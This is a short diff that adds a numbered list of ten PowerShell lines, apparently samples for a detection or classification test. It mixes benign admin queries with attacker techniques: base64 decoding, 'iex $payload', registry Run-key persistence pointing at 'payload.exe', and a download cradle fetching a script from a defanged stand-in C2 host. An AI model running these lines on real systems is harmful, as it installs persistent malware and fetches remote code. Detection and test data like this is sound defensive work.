@@ -1,0 +1,10 @@
+1. [System.Convert]::FromBase64String($b)
+2. New-Object -ComObject WScript.Shell
+3. Get-CimInstance Win32_Process
+4. Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name Updater -Value $cmd
+5. iex $payload
+6. Invoke-Command -ComputerName DC01 -ScriptBlock { Get-Process }
+7. (Get-Acl $path).Access
+8. [System.Net.WebClient]::new().DownloadString('hxxp://cdn.fake-c2[.]test/a.ps1')
+9. Get-WmiObject Win32_Service
+10. $sh.RegWrite('HKLM\Software\Microsoft\Windows\CurrentVersion\Run\x', 'payload.exe', 'REG_SZ')
